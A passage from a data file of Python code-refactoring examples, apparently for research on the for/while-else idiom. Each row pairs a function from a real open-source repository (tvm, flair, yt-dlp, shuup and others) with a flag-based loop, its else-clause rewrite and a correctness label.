    else:
        not_usable_free_resources.append(free_resource)
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')","while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        allocation_plan[required_resource.container_name] = free_resource.node_name
        free_resource.cpu -= required_resource.cpu
        free_resource.memory -= required_resource.memory
        free_resource.gpu -= required_resource.gpu
        heapq.heappush(free_resources_pq, (getattr(free_resource, metric), free_resource))
        for not_usable_free_resource in not_usable_free_resources:
            heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
        break
    else:
        not_usable_free_resources.append(free_resource)
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')",1,"while len(free_resources_pq) > 0:
    free_resource = heapq.heappop(free_resources_pq)[1]
    if free_resource >= required_resource:
        is_allocated = True
        break
    else:
        not_usable_free_resources.append(free_resource)
if is_allocated:
    allocation_plan[required_resource.container_name] = free_resource.node_name
    free_resource.cpu -= required_resource.cpu
    free_resource.memory -= required_resource.memory
    free_resource.gpu -= required_resource.gpu
    heapq.heappush(free_resources_pq, (getattr(free_resource, metric), free_resource))
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
else:
    for not_usable_free_resource in not_usable_free_resources:
        heapq.heappush(free_resources_pq, (getattr(not_usable_free_resource, metric), not_usable_free_resource))
    heapq.heappush(required_resources_pq, (-getattr(required_resource, metric), required_resource))
    logger.warning(allocation_plan)
    logger.warning(required_resources_pq)
    logger.warning(free_resources_pq)
    raise ResourceAllocationFailed('Unable to allocate, Abort')","break statement is executed:zejun1
break statement is not executed:None"
urh,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/urh/tests/device/TestRTLSDRPipe.py,https://github.com/jopohl/urh/tree/master/tests/device/TestRTLSDRPipe.py,,receive_sync$27,"def receive_sync(connection):
    rtlsdr.open(0)
    rtlsdr.reset_buffer()
    exit_requested = False

    while not exit_requested:
        while connection.poll():
            result = process_command(connection.recv())
            if result == ""stop"":
                exit_requested = True
                break

        if not exit_requested:
            connection.send_bytes(rtlsdr.read_sync())

    connection.close()","while connection.poll():
    result = process_command(connection.recv())
    if result == 'stop':
        exit_requested = True
        break
if not exit_requested:
    connection.send_bytes(rtlsdr.read_sync())","while connection.poll():
    result = process_command(connection.recv())
    if result == 'stop':
        break
else:
    connection.send_bytes(rtlsdr.read_sync())","while connection.poll():
    result = process_command(connection.recv())
    if result == 'stop':
        break
else:
    connection.send_bytes(rtlsdr.read_sync())",1,"while connection.poll():
    result = process_command(connection.recv())
    if result == 'stop':
        exit_requested = True
        break
if not exit_requested:
    connection.send_bytes(rtlsdr.read_sync())","break statement is executed:None
break statement is not executed:zejun1"
Karta,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/Karta/src/matching_engine.py,https://github.com/CheckPointSW/Karta/tree/master/src/matching_engine.py,KartaMatcher,prepareBinFunctions$266,"def prepareBinFunctions(self):
        """"""Prepare all of the binary contexts for use.""""""
        self.logger.info(""Converting all binary function references to use the built contexts (instead of eas)"")
        # Traverse all of the contexts of the binary functions, and split them to internal / external calls
        for bin_func_ctx in self.bin_functions_ctx.values():
            bin_internal_calls = []
            bin_external_calls = []
            for call_ea in bin_func_ctx.calls:
                if call_ea in self.bin_functions_ctx:
                    bin_internal_calls.append(self.bin_functions_ctx[call_ea])
                else:
                    bin_external_calls.append(call_ea)
            bin_func_ctx.calls = set(bin_internal_calls)
            bin_func_ctx.externals = bin_external_calls
            # the call order too
            new_order = {}
            for call_ea in bin_func_ctx.call_order:
                if call_ea in self.bin_functions_ctx:
                    key = self.bin_functions_ctx[call_ea]
                else:
                    key = call_ea
                new_order[key] = []
                for path in bin_func_ctx.call_order[call_ea]:
                    inner_calls = set()
                    for inner_call in path:
                        if inner_call in self.bin_functions_ctx:
                            inner_calls.add(self.bin_functions_ctx[inner_call])
                        else:
                            inner_calls.add(inner_call)
                    new_order[key].append(inner_calls)
            bin_func_ctx.call_order = new_order

            # Build up an xref map too
            for call in bin_func_ctx.calls:
                call.xrefs.add(bin_func_ctx)

            # Now check for outer xrefs
            outer_ref = False
            for ref in filter(lambda x: self.disas.funcAt(x) is not None, self.disas.crefsTo(bin_func_ctx.ea)):
                if self.disas.funcStart(self.disas.funcAt(ref)) not in self.bin_functions_ctx:
                    outer_ref = True
                    break
            if not outer_ref:
                bin_func_ctx.markStatic()","for ref in filter(lambda x: self.disas.funcAt(x) is not None, self.disas.crefsTo(bin_func_ctx.ea)):
    if self.disas.funcStart(self.disas.funcAt(ref)) not in self.bin_functions_ctx:
        outer_ref = True
        break
if not outer_ref:
    bin_func_ctx.markStatic()","for ref in filter(lambda x: self.disas.funcAt(x) is not None, self.disas.crefsTo(bin_func_ctx.ea)):
    if self.disas.funcStart(self.disas.funcAt(ref)) not in self.bin_functions_ctx:
        break
else:
    bin_func_ctx.markStatic()","for ref in filter(lambda x: self.disas.funcAt(x) is not None, self.disas.crefsTo(bin_func_ctx.ea)):
    if self.disas.funcStart(self.disas.funcAt(ref)) not in self.bin_functions_ctx:
        break
else:
    bin_func_ctx.markStatic()",1,"for ref in filter(lambda x: self.disas.funcAt(x) is not None, self.disas.crefsTo(bin_func_ctx.ea)):
    if self.disas.funcStart(self.disas.funcAt(ref)) not in self.bin_functions_ctx:
        outer_ref = True
        break
if not outer_ref:
    bin_func_ctx.markStatic()","break statement is executed:None
break statement is not executed:zejun1"
tvm,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/tvm/python/tvm/micro/project_api/server.py,https://github.com/apache/tvm/tree/master/python/tvm/micro/project_api/server.py,,default_project_options$767,"def default_project_options(**kw) -> typing.List[ProjectOption]:
    """"""Get default Project Options

    Attributes of any default option can be updated. Here is an example
    when attribute `optional` from `verbose` option needs to be updates:

        default_project_options(verbose={""optional"": [""build""]})

    This will update the `optional` attribute of `verbose` ProjectOption
    to be `[""build""]`.

    Returns
    -------
    options: List[ProjectOption]
        A list of default ProjectOption with modifications.
    """"""
    options = [
        ProjectOption(
            ""verbose"",
            optional=[""generate_project""],
            type=""bool"",
            default=False,
            help=""Run build with verbose output."",
        ),
        ProjectOption(
            ""project_type"",
            required=[""generate_project""],
            type=""str"",
            help=""Type of project to generate."",
        ),
        ProjectOption(
            ""board"",
            required=[""generate_project""],
            type=""str"",
            help=""Name of the board to build for."",
        ),
        ProjectOption(
            ""cmsis_path"",
            optional=[""generate_project""],
            type=""str"",
            default=None,
            help=""Path to the CMSIS directory."",
        ),
        ProjectOption(
            ""warning_as_error"",
            optional=[""generate_project""],
            type=""bool"",
            default=False,
            help=""Treat warnings as errors and raise an Exception."",
        ),
        ProjectOption(
            ""compile_definitions"",
            optional=[""generate_project""],
            type=""str"",
            default=None,
            help=""Extra definitions added project compile."",
        ),
        ProjectOption(
            ""extra_files_tar"",
            optional=[""generate_project""],
            type=""str"",
            default=None,
            help=""If given, during generate_project, ""
            ""uncompress the tarball at this path into the project dir."",
        ),
    ]
    for name, config in kw.items():
        option_found = False
        for ind, option in enumerate(options):
            if option.name == name:
                options[ind] = option.replace(config)
                option_found = True
                break
        if not option_found:
            raise ValueError(""Option {} was not found in default ProjectOptions."".format(name))

    return options","for (ind, option) in enumerate(options):
    if option.name == name:
        options[ind] = option.replace(config)
        option_found = True
        break
if not option_found:
    raise ValueError('Option {} was not found in default ProjectOptions.'.format(name))","for (ind, option) in enumerate(options):
    if option.name == name:
        options[ind] = option.replace(config)
        break
else:
    raise ValueError('Option {} was not found in default ProjectOptions.'.format(name))","for (ind, option) in enumerate(options):
    if option.name == name:
        options[ind] = option.replace(config)
        break
else:
    raise ValueError('Option {} was not found in default ProjectOptions.'.format(name))",1,"for (ind, option) in enumerate(options):
    if option.name == name:
        options[ind] = option.replace(config)
        option_found = True
        break
if not option_found:
    raise ValueError('Option {} was not found in default ProjectOptions.'.format(name))","break statement is executed:None
break statement is not executed:zejun1"
sdc,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/sdc/sdc/datatypes/hpat_pandas_dataframe_pass.py,https://github.com/IntelPython/sdc/tree/master/sdc/datatypes/hpat_pandas_dataframe_pass.py,SDC_Pandas_DataFrame_TransformationPass_Stage1,run_pass$301,"def run_pass(self, state):
        self.state = state
        # replace inst variables as determined previously during the pass
        # currently use to keep lhs of Arg nodes intact
        self.replace_var_dict = {}

        # df_var -> {col1:col1_var ...}
        self.df_vars = {}
        # df_var -> label where it is defined
        self.df_labels = {}

        ir_utils._max_label = max(self.state.func_ir.blocks.keys())  # shssf:  is it still needed?

        # FIXME: see why this breaks test_kmeans
        # remove_dels(self.state.func_ir.blocks)
        ir_utils.dprint_func_ir(self.state.func_ir, self._name)
        blocks = self.state.func_ir.blocks
        # call build definition since rewrite pass doesn't update definitions
        # e.g. getitem to static_getitem in test_column_list_select2
        self.state.func_ir._definitions = build_definitions(blocks)
        # topo_order necessary since df vars need to be found before use
        topo_order = find_topo_order(blocks)
        work_list = list((l, blocks[l]) for l in reversed(topo_order))
        while work_list:
            label, block = work_list.pop()
            new_body = []
            replaced = False
            self._working_body = new_body
            for i, inst in enumerate(block.body):
                self._replace_vars(inst)
                out_nodes = [inst]

                # handle potential dataframe set column here
                # df['col'] = arr
                if (isinstance(inst, ir.StaticSetItem)
                        and isinstance(inst.index, str)):
                    # cfg needed for set df column
                    cfg = ir_utils.compute_cfg_from_blocks(blocks)
                    out_nodes = self._run_df_set_column(inst, label, cfg)
                elif isinstance(inst, ir.Assign):
                    self.state.func_ir._definitions[inst.target.name].remove(inst.value)
                    out_nodes = self._run_assign(inst, label)

                if isinstance(out_nodes, list):
                    # TODO: fix scope/loc
                    new_body.extend(out_nodes)
                    self._update_definitions(out_nodes)
                if isinstance(out_nodes, sdc.utilities.utils.ReplaceFunc):
                    rp_func = out_nodes
                    if rp_func.pre_nodes is not None:
                        new_body.extend(rp_func.pre_nodes)
                        self._update_definitions(rp_func.pre_nodes)
                    # replace inst.value to a call with target args
                    # as expected by numba.core.inline_closurecall.inline_closure_call
                    # TODO: inst other than Assign?
                    inst.value = ir.Expr.call(
                        ir.Var(block.scope, ""dummy"", inst.loc),
                        rp_func.args, (), inst.loc)
                    block.body = new_body + block.body[i:]
                    sdc.utilities.utils.update_globals(rp_func.func, rp_func.glbls)
                    numba.core.inline_closurecall.inline_closure_call(self.state.func_ir, rp_func.glbls,
                                        block, len(new_body), rp_func.func, work_list=work_list)
                    replaced = True
                    break
                if isinstance(out_nodes, dict):
                    block.body = new_body + block.body[i:]
                    # TODO: insert new blocks in current spot of work_list
                    # instead of append?
                    # TODO: rename variables, fix scope/loc
                    sdc.utilities.utils.inline_new_blocks(
                        self.state.func_ir, block, len(new_body), out_nodes, work_list)
                    replaced = True
                    break
            if not replaced:
                blocks[label].body = new_body

        self.state.func_ir.blocks = ir_utils.simplify_CFG(self.state.func_ir.blocks)
        # self.state.func_ir._definitions = build_definitions(blocks)
        # XXX: remove dead here fixes h5 slice issue
        # iterative remove dead to make sure all extra code (e.g. df vars) is removed
        # while remove_dead(blocks, self.state.func_ir.arg_names, self.state.func_ir):
        #     pass
        self.state.func_ir._definitions = build_definitions(blocks)
        ir_utils.dprint_func_ir(self.state.func_ir, self._name)

        return True","for (i, inst) in enumerate(block.body):
    self._replace_vars(inst)
    out_nodes = [inst]
    if isinstance(inst, ir.StaticSetItem) and isinstance(inst.index, str):
        cfg = ir_utils.compute_cfg_from_blocks(blocks)
        out_nodes = self._run_df_set_column(inst, label, cfg)
    elif isinstance(inst, ir.Assign):
        self.state.func_ir._definitions[inst.target.name].remove(inst.value)
        out_nodes = self._run_assign(inst, label)
    if isinstance(out_nodes, list):
        new_body.extend(out_nodes)
        self._update_definitions(out_nodes)
    if isinstance(out_nodes, sdc.utilities.utils.ReplaceFunc):
        rp_func = out_nodes
        if rp_func.pre_nodes is not None:
            new_body.extend(rp_func.pre_nodes)
            self._update_definitions(rp_func.pre_nodes)
        inst.value = ir.Expr.call(ir.Var(block.scope, 'dummy', inst.loc), rp_func.args, (), inst.loc)
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.update_globals(rp_func.func, rp_func.glbls)
        numba.core.inline_closurecall.inline_closure_call(self.state.func_ir, rp_func.glbls, block, len(new_body), rp_func.func, work_list=work_list)
        replaced = True
        break
    if isinstance(out_nodes, dict):
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.inline_new_blocks(self.state.func_ir, block, len(new_body), out_nodes, work_list)
        replaced = True
        break
if not replaced:
    blocks[label].body = new_body","for (i, inst) in enumerate(block.body):
    self._replace_vars(inst)
    out_nodes = [inst]
    if isinstance(inst, ir.StaticSetItem) and isinstance(inst.index, str):
        cfg = ir_utils.compute_cfg_from_blocks(blocks)
        out_nodes = self._run_df_set_column(inst, label, cfg)
    elif isinstance(inst, ir.Assign):
        self.state.func_ir._definitions[inst.target.name].remove(inst.value)
        out_nodes = self._run_assign(inst, label)
    if isinstance(out_nodes, list):
        new_body.extend(out_nodes)
        self._update_definitions(out_nodes)
    if isinstance(out_nodes, sdc.utilities.utils.ReplaceFunc):
        rp_func = out_nodes
        if rp_func.pre_nodes is not None:
            new_body.extend(rp_func.pre_nodes)
            self._update_definitions(rp_func.pre_nodes)
        inst.value = ir.Expr.call(ir.Var(block.scope, 'dummy', inst.loc), rp_func.args, (), inst.loc)
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.update_globals(rp_func.func, rp_func.glbls)
        numba.core.inline_closurecall.inline_closure_call(self.state.func_ir, rp_func.glbls, block, len(new_body), rp_func.func, work_list=work_list)
        break
    if isinstance(out_nodes, dict):
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.inline_new_blocks(self.state.func_ir, block, len(new_body), out_nodes, work_list)
        break
else:
    blocks[label].body = new_body","for (i, inst) in enumerate(block.body):
    self._replace_vars(inst)
    out_nodes = [inst]
    if isinstance(inst, ir.StaticSetItem) and isinstance(inst.index, str):
        cfg = ir_utils.compute_cfg_from_blocks(blocks)
        out_nodes = self._run_df_set_column(inst, label, cfg)
    elif isinstance(inst, ir.Assign):
        self.state.func_ir._definitions[inst.target.name].remove(inst.value)
        out_nodes = self._run_assign(inst, label)
    if isinstance(out_nodes, list):
        new_body.extend(out_nodes)
        self._update_definitions(out_nodes)
    if isinstance(out_nodes, sdc.utilities.utils.ReplaceFunc):
        rp_func = out_nodes
        if rp_func.pre_nodes is not None:
            new_body.extend(rp_func.pre_nodes)
            self._update_definitions(rp_func.pre_nodes)
        inst.value = ir.Expr.call(ir.Var(block.scope, 'dummy', inst.loc), rp_func.args, (), inst.loc)
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.update_globals(rp_func.func, rp_func.glbls)
        numba.core.inline_closurecall.inline_closure_call(self.state.func_ir, rp_func.glbls, block, len(new_body), rp_func.func, work_list=work_list)
        break
    if isinstance(out_nodes, dict):
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.inline_new_blocks(self.state.func_ir, block, len(new_body), out_nodes, work_list)
        break
else:
    blocks[label].body = new_body",1,"for (i, inst) in enumerate(block.body):
    self._replace_vars(inst)
    out_nodes = [inst]
    if isinstance(inst, ir.StaticSetItem) and isinstance(inst.index, str):
        cfg = ir_utils.compute_cfg_from_blocks(blocks)
        out_nodes = self._run_df_set_column(inst, label, cfg)
    elif isinstance(inst, ir.Assign):
        self.state.func_ir._definitions[inst.target.name].remove(inst.value)
        out_nodes = self._run_assign(inst, label)
    if isinstance(out_nodes, list):
        new_body.extend(out_nodes)
        self._update_definitions(out_nodes)
    if isinstance(out_nodes, sdc.utilities.utils.ReplaceFunc):
        rp_func = out_nodes
        if rp_func.pre_nodes is not None:
            new_body.extend(rp_func.pre_nodes)
            self._update_definitions(rp_func.pre_nodes)
        inst.value = ir.Expr.call(ir.Var(block.scope, 'dummy', inst.loc), rp_func.args, (), inst.loc)
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.update_globals(rp_func.func, rp_func.glbls)
        numba.core.inline_closurecall.inline_closure_call(self.state.func_ir, rp_func.glbls, block, len(new_body), rp_func.func, work_list=work_list)
        replaced = True
        break
    if isinstance(out_nodes, dict):
        block.body = new_body + block.body[i:]
        sdc.utilities.utils.inline_new_blocks(self.state.func_ir, block, len(new_body), out_nodes, work_list)
        replaced = True
        break
if not replaced:
    blocks[label].body = new_body","break statement is executed:None
break statement is not executed:zejun1"
flair,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/flair/flair/datasets/document_classification.py,https://github.com/flairNLP/flair/tree/master/flair/datasets/document_classification.py,CSVClassificationDataset,__init__$421,"def __init__(
        self,
        path_to_file: Union[str, Path],
        column_name_map: Dict[int, str],
        label_type: str,
        max_tokens_per_doc: int = -1,
        max_chars_per_doc: int = -1,
        tokenizer: Tokenizer = SegtokTokenizer(),
        in_memory: bool = True,
        skip_header: bool = False,
        encoding: str = ""utf-8"",
        no_class_label=None,
        **fmtparams,
    ):
        """"""
        Instantiates a Dataset for text classification from CSV column formatted data

        :param path_to_file: path to the file with the CSV data
        :param column_name_map: a column name map that indicates which column is text and which the label(s)
        :param label_type: name of the label
        :param max_tokens_per_doc: If set, truncates each Sentence to a maximum number of Tokens
        :param max_chars_per_doc: If set, truncates each Sentence to a maximum number of chars
        :param tokenizer: Tokenizer for dataset, default is SegTokTokenizer
        :param in_memory: If True, keeps dataset as Sentences in memory, otherwise only keeps strings
        :param skip_header: If True, skips first line because it is header
        :param encoding: Most datasets are 'utf-8' but some are 'latin-1'
        :param fmtparams: additional parameters for the CSV file reader
        :return: a Corpus with annotated train, dev and test data
        """"""

        path_to_file = Path(path_to_file)

        assert path_to_file.exists()

        # variables
        self.path_to_file = path_to_file
        self.in_memory = in_memory
        self.tokenizer = tokenizer
        self.column_name_map = column_name_map
        self.max_tokens_per_doc = max_tokens_per_doc
        self.max_chars_per_doc = max_chars_per_doc
        self.no_class_label = no_class_label

        self.label_type = label_type

        # different handling of in_memory data than streaming data
        if self.in_memory:
            self.sentences = []
        else:
            self.raw_data = []

        self.total_sentence_count: int = 0

        # most data sets have the token text in the first column, if not, pass 'text' as column
        self.text_columns: List[int] = []
        self.pair_columns: List[int] = []
        for column in column_name_map:
            if column_name_map[column] == ""text"":
                self.text_columns.append(column)
            if column_name_map[column] == ""pair"":
                self.pair_columns.append(column)

        with open(self.path_to_file, encoding=encoding) as csv_file:

            csv_reader = csv.reader(csv_file, **fmtparams)

            if skip_header:
                next(csv_reader, None)  # skip the headers

            for row in csv_reader:

                # test if format is OK
                wrong_format = False
                for text_column in self.text_columns:
                    if text_column >= len(row):
                        wrong_format = True

                if wrong_format:
                    continue

                # test if at least one label given
                has_label = False
                for column in self.column_name_map:
                    if self.column_name_map[column].startswith(""label"") and row[column]:
                        has_label = True
                        break

                if not has_label:
                    continue

                if self.in_memory:

                    sentence = self._make_labeled_data_point(row)

                    self.sentences.append(sentence)

                else:
                    self.raw_data.append(row)

                self.total_sentence_count += 1","for column in self.column_name_map:
    if self.column_name_map[column].startswith('label') and row[column]:
        has_label = True
        break
if not has_label:
    continue","for column in self.column_name_map:
    if self.column_name_map[column].startswith('label') and row[column]:
        break
else:
    continue","for column in self.column_name_map:
    if self.column_name_map[column].startswith('label') and row[column]:
        break
else:
    continue",1,"for column in self.column_name_map:
    if self.column_name_map[column].startswith('label') and row[column]:
        has_label = True
        break
if not has_label:
    continue","break statement is executed:None
break statement is not executed:zejun1"
shuup,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/shuup/shuup/default_importer/importers/product.py,https://github.com/shuup/shuup/tree/master/shuup/default_importer/importers/product.py,ProductMetaBase,handle_stocks$220,"def handle_stocks(self, fields, sess):  # noqa (C901)
        """"""
        Handle stocks for product.

        If stock quantity has been given, expect that a supplier with stock management must be available.
        """"""
        # convert all keys to lowercase
        row = {k.lower(): v for k, v in sess.row.items()}

        # check if row even has these fields we are requiring
        field_found = False
        for qty_field in self.aliases[""qty""]:
            if qty_field in row:
                field_found = True
                break

        if not field_found:  # no need to process this as qty was not available
            return

        supplier = row.get(""supplier"")
        if not supplier:
            msg = _(""Please add supplier to the row, before importing stock quantities."")
            sess.log_messages.append(msg)
            return

        if isinstance(supplier, str):
            supplier = Supplier.objects.filter(name=supplier).first()
        else:
            supplier = sess.importer.resolve_object(Supplier, supplier)

        if not supplier:
            msg = _(""No supplier found, please check that the supplier exists."")
            sess.log_messages.append(msg)
            return

        qty = None
        for qty_field in self.aliases[""qty""]:
            qty_field = qty_field.lower()
            qty = row.get(qty_field, None)

        if not qty:
            return

        supplier_changed = False
        if not supplier.stock_managed:
            supplier.stock_managed = True
            supplier_changed = True

        if not supplier.supplier_modules.all().exists() and has_installed(""shuup.simple_supplier""):
            supplier_module = SupplierModule.objects.get_or_create(module_identifier=SimpleSupplierModule.identifier)[0]
            supplier.supplier_modules.add(supplier_module)
            supplier_changed = True

        if not supplier.supplier_modules:
            msg = _(""No supplier module set, please check that the supplier module is set."")
            sess.log_messages.append(msg)
            return

        if supplier_changed:
            supplier.full_clean()
            supplier.save()

        product = sess.instance
        stock_status = supplier.get_stock_status(product.pk)
        stock_delta = decimal.Decimal(qty)
        if stock_status:
            stock_delta = decimal.Decimal(qty) - stock_status.logical_count

        if stock_delta != 0:
            supplier.adjust_stock(product.pk, stock_delta)","for qty_field in self.aliases['qty']:
    if qty_field in row:
        field_found = True
        break
if not field_found:
    return","for qty_field in self.aliases['qty']:
    if qty_field in row:
        break
else:
    return","for qty_field in self.aliases['qty']:
    if qty_field in row:
        break
else:
    return",1,"for qty_field in self.aliases['qty']:
    if qty_field in row:
        field_found = True
        break
if not field_found:
    return","break statement is executed:None
break statement is not executed:zejun1"
yt-dlp,/data1/zhangzejun/mnt/zejun/smp/data/python_star_2000repo/yt-dlp/yt_dlp/extractor/vvvvid.py,https://github.com/yt-dlp/yt-dlp/tree/master/yt_dlp/extractor/vvvvid.py,VVVVIDIE,_real_extract$100,"def _real_extract(self, url):
        show_id, season_id, video_id = self._match_valid_url(url).groups()

        response = self._download_info(
            show_id, 'season/%s' % season_id,
            video_id, query={'video_id': video_id})

        vid = int(video_id)
        video_data = list(filter(
            lambda episode: episode.get('video_id') == vid, response))[0]
        title = video_data['title']
        formats = []

        # vvvvid embed_info decryption algorithm is reverse engineered from function $ds(h) at vvvvid.js
        def ds(h):
            g = ""MNOPIJKL89+/4567UVWXQRSTEFGHABCDcdefYZabstuvopqr0123wxyzklmnghij""

            def f(m):
                l = []
                o = 0
                b = False
                m_len = len(m)
                while ((not b) and o < m_len):
                    n = m[o] << 2
                    o += 1
                    k = -1
                    j = -1
                    if o < m_len:
                        n += m[o] >> 4
                        o += 1
                        if o < m_len:
                            k = (m[o - 1] << 4) & 255
                            k += m[o] >> 2
                            o += 1
                            if o < m_len:
                                j = (m[o - 1] << 6) & 255
                                j += m[o]
                                o += 1
                            else:
                                b = True
                        else:
                            b = True
                    else:
                        b = True
                    l.append(n)
                    if k != -1:
                        l.append(k)
                    if j != -1:
                        l.append(j)
                return l

            c = []
            for e in h:
                c.append(g.index(e))

            c_len = len(c)
            for e in range(c_len * 2 - 1, -1, -1):
                a = c[e % c_len] ^ c[(e + 1) % c_len]
                c[e % c_len] = a

            c = f(c)
            d = ''
            for e in c:
                d += chr(e)

            return d

        info = {}

        def metadata_from_url(r_url):
            if not info and r_url:
                mobj = re.search(r'_(?:S(\d+))?Ep(\d+)', r_url)
                if mobj:
                    info['episode_number'] = int(mobj.group(2))
                    season_number = mobj.group(1)
                    if season_number:
                        info['season_number'] = int(season_number)

        video_type = video_data.get('video_type')
        is_youtube = False
        for quality in ('', '_sd'):
            embed_code = video_data.get('embed_info' + quality)
            if not embed_code:
                continue
            embed_code = ds(embed_code)
            if video_type == 'video/kenc':
                embed_code = re.sub(r'https?(://[^/]+)/z/', r'https\1/i/', embed_code).replace('/manifest.f4m', '/master.m3u8')
                kenc = self._download_json(
                    'https://www.vvvvid.it/kenc', video_id, query={
                        'action': 'kt',
                        'conn_id': self._conn_id,
                        'url': embed_code,
                    }, fatal=False) or {}
                kenc_message = kenc.get('message')
                if kenc_message:
                    embed_code += '?' + ds(kenc_message)
                formats.extend(self._extract_m3u8_formats(
                    embed_code, video_id, 'mp4', m3u8_id='hls', fatal=False))
            elif video_type == 'video/rcs':
                formats.extend(self._extract_akamai_formats(embed_code, video_id))
            elif video_type == 'video/youtube':
                info.update({
                    '_type': 'url_transparent',
                    'ie_key': YoutubeIE.ie_key(),
                    'url': embed_code,
                })
                is_youtube = True
                break
            else:
                formats.extend(self._extract_wowza_formats(
                    'http://sb.top-ix.org/videomg/_definst_/mp4:%s/playlist.m3u8' % embed_code, video_id))
            metadata_from_url(embed_code)

        if not is_youtube:
            self._sort_formats(formats)
            info['formats'] = formats

        metadata_from_url(video_data.get('thumbnail'))
        info.update(self._extract_common_video_info(video_data))
        info.update({
            'id': video_id,
            'title': title,
            'duration': int_or_none(video_data.get('length')),
            'series': video_data.get('show_title'),
            'season_id': season_id,
            'episode': title,
            'view_count': int_or_none(video_data.get('views')),
            'like_count': int_or_none(video_data.get('video_likes')),
            'repost_count': int_or_none(video_data.get('video_shares')),
        })
        return info","for quality in ('', '_sd'):
    embed_code = video_data.get('embed_info' + quality)
    if not embed_code:
        continue
    embed_code = ds(embed_code)
    if video_type == 'video/kenc':
        embed_code = re.sub('https?(://[^/]+)/z/', 'https\\1/i/', embed_code).replace('/manifest.f4m', '/master.m3u8')
        kenc = self._download_json('https://www.vvvvid.it/kenc', video_id, query={'action': 'kt', 'conn_id': self._conn_id, 'url': embed_code}, fatal=False) or {}
        kenc_message = kenc.get('message')
        if kenc_message:
            embed_code += '?' + ds(kenc_message)
        formats.extend(self._extract_m3u8_formats(embed_code, video_id, 'mp4', m3u8_id='hls', fatal=False))
    elif video_type == 'video/rcs':
        formats.extend(self._extract_akamai_formats(embed_code, video_id))
    elif video_type == 'video/youtube':
        info.update({'_type': 'url_transparent', 'ie_key': YoutubeIE.ie_key(), 'url': embed_code})
        is_youtube = True
        break
    else:
        formats.extend(self._extract_wowza_formats('http://sb.top-ix.org/videomg/_definst_/mp4:%s/playlist.m3u8' % embed_code, video_id))
    metadata_from_url(embed_code)
if not is_youtube:
    self._sort_formats(formats)
    info['formats'] = formats","for quality in ('', '_sd'):
    embed_code = video_data.get('embed_info' + quality)
    if not embed_code:
        continue
    embed_code = ds(embed_code)
    if video_type == 'video/kenc':
        embed_code = re.sub('https?(://[^/]+)/z/', 'https\\1/i/', embed_code).replace('/manifest.f4m', '/master.m3u8')
        kenc = self._download_json('https://www.vvvvid.it/kenc', video_id, query={'action': 'kt', 'conn_id': self._conn_id, 'url': embed_code}, fatal=False) or {}
        kenc_message = kenc.get('message')
        if kenc_message:
            embed_code += '?' + ds(kenc_message)
        formats.extend(self._extract_m3u8_formats(embed_code, video_id, 'mp4', m3u8_id='hls', fatal=False))
    elif video_type == 'video/rcs':
        formats.extend(self._extract_akamai_formats(embed_code, video_id))
    elif video_type == 'video/youtube':
        info.update({'_type': 'url_transparent', 'ie_key': YoutubeIE.ie_key(), 'url': embed_code})
        is_youtube = True
        break
    else:
        formats.extend(self._extract_wowza_formats('http://sb.top-ix.org/videomg/_definst_/mp4:%s/playlist.m3u8' % embed_code, video_id))
    metadata_from_url(embed_code)
else:
    self._sort_formats(formats)
    info['formats'] = formats","for quality in ('', '_sd'):
    embed_code = video_data.get('embed_info' + quality)
    if not embed_code:
        continue
    embed_code = ds(embed_code)
    if video_type == 'video/kenc':
        embed_code = re.sub('https?(://[^/]+)/z/', 'https\\1/i/', embed_code).replace('/manifest.f4m', '/master.m3u8')
        kenc = self._download_json('https://www.vvvvid.it/kenc', video_id, query={'action': 'kt', 'conn_id': self._conn_id, 'url': embed_code}, fatal=False) or {}
        kenc_message = kenc.get('message')
        if kenc_message:
            embed_code += '?' + ds(kenc_message)
        formats.extend(self._extract_m3u8_formats(embed_code, video_id, 'mp4', m3u8_id='hls', fatal=False))
    elif video_type == 'video/rcs':
        formats.extend(self._extract_akamai_formats(embed_code, video_id))
    elif video_type == 'video/youtube':
        info.update({'_type': 'url_transparent', 'ie_key': YoutubeIE.ie_key(), 'url': embed_code})
        break
    else:
        formats.extend(self._extract_wowza_formats('http://sb.top-ix.org/videomg/_definst_/mp4:%s/playlist.m3u8' % embed_code, video_id))
    metadata_from_url(embed_code)
else:
    self._sort_formats(formats)
    info['formats'] = formats",0,"for quality in ('', '_sd'):
    embed_code = video_data.get('embed_info' + quality)
    if not embed_code:
        continue
    embed_code = ds(embed_code)
    if video_type == 'video/kenc':
        embed_code = re.sub('https?(://[^/]+)/z/', 'https\\1/i/', embed_code).replace('/manifest.f4m', '/master.m3u8')
        kenc = self._download_json('https://www.vvvvid.it/kenc', video_id, query={'action': 'kt', 'conn_id': self._conn_id, 'url': embed_code}, fatal=False) or {}
        kenc_message = kenc.get('message')
        if kenc_message:
            embed_code += '?' + ds(kenc_message)
        formats.extend(self._extract_m3u8_formats(embed_code, video_id, 'mp4', m3u8_id='hls', fatal=False))
    elif video_type == 'video/rcs':
